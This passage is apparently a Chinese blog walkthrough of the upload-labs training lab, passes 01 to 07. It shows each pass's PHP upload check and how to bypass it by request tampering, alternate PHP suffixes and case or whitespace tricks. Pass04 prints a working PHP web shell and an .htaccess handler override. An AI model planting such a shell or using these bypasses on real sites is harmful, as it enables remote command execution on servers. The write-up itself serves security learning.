 <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里只使用了前端检测，后端没有进行判断，所以可以通过<strong>抓包/修改js代码</strong>等方法绕过</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>写一个<code>1.jpg</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141827866.png" alt="image-20201130141827866"></p>
<p>上传，抓包，修改文件名称为<code>1.php</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141935932.png" alt="image-20201130141935932"></p>
<p>访问<code>http://ip:port/upload/1.php?c=id</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142347530.png" alt="image-20201130142347530"></p>
<h2 id="pass02"><a href="#pass02" class="headerlink" title="pass02"></a>pass02</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了<code>Content-Type</code>判断文件是否是图片，可以通过修改<code>Content-Type</code>绕过</p>
<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>修改<code>Content-Type</code>为目标支持的格式，这里修改为<code>image/jpeg</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142739528.png" alt="image-20201130142739528"></p>
<p>访问<code>http://ip:port/upload/2.php?c=whoami</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142909834.png" alt="image-20201130142909834"></p>
<h2 id="pass03"><a href="#pass03" class="headerlink" title="pass03"></a>pass03</h2><h3 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里判断了后缀名<code>.asp .aspx .php .jsp </code>后缀的文件不能上传</p>
<p>由于文件名采用了<code>time+random</code>形式使用<code>.htaccess .php.ini .user.ini</code>这些绕过</p>
<p>所以使用<code>php3 php4 php5</code>等后缀名绕过，但是需要在<code>/etc/apache2/apache2.conf</code>里面包含<code>php5.conf</code>文件，本环境没有包含，仅作为参考</p>
<p>如果目标是<code>Windows</code>系统，还可以通过大小写绕过。</p>
<h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h3><p>修改文件后缀名为<code>php5</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130144348250.png" alt="image-20201130144348250"></p>
<p>访问文件，由于没有在<code>apache2</code>中配置，所以无法被解析。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130144451391.png" alt="image-20201130144451391"></p>
<h2 id="pass04"><a href="#pass04" class="headerlink" title="pass04"></a>pass04</h2><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里过滤了很多后缀名，但是没有把上传的文件重命名，所以可以采用<code>.htaccess .php.ini .user.ini</code>绕过</p>
<p>仔细看，会发现<code>array</code>里面的后缀名有些写错了，例如<code>php1 ==&gt; .php1</code></p>
<h3 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h3><p>上传<code>.htaccess</code>:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">xxx</span>&quot;&gt;</span>  </span><br><span class="line">		SetHandler application/x-httpd-php  </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后上传<code>xxx</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">	phpinfo(); </span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问<code>http://ip:port/upload/xxx?c=pwd</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130150821889.png" alt="image-20201130150821889"></p>
<h2 id="pass05"><a href="#pass05" class="headerlink" title="pass05"></a>pass05</h2><h3 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样是黑名单，但是这次加上了<code>.htaccess</code>，本想通过<code>.user.ini</code>绕过，但是考虑到<code>./upload</code>目录下没有php文件，就算上传了也无从触发。</p>
<p>对比和上面的代码，不只是过滤了<code>.htaccess</code>，而且没有转换成小写</p>
<p><code>diff</code> 命令可以查看两者的区别</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130151535702.png" alt="image-20201130151535702"></p>
<h3 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h3><p>绕过的方法就很简单了——大小写绕过</p>
<p>但是这种方法只在windows下有效，由于我的环境是Linux，所以无法触发这个。</p>
<p><strong><font color='red'>这五道题大多是利用了windows系统的特性，由于我使用的环境是Linux，无法产生实际的效果，也就没有效果图</font></strong></p>
<p>挖个坑，以后用虚拟机配个windows复现一下</p>
<h2 id="pass06"><a href="#pass06" class="headerlink" title="pass06"></a>pass06</h2><h3 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个相比于<code>pass04</code>，少了一个<code>trim</code>语句</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130152326897.png" alt="image-20201130152326897"></p>
<p><code>trim</code>的作用是去掉首位的空格</p>
<p>所以这里的解法就是在文件名末尾加入一个空格即可</p>
<h3 id="绕过-5"><a href="#绕过-5" class="headerlink" title="绕过"></a>绕过</h3><p>由于这也是windows系统的特性，所以我无法复现场景。</p>
<h2 id="pass07"><a href="#pass07" class="headerlink" title="pass07"></a>pass07</h2><h3 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span 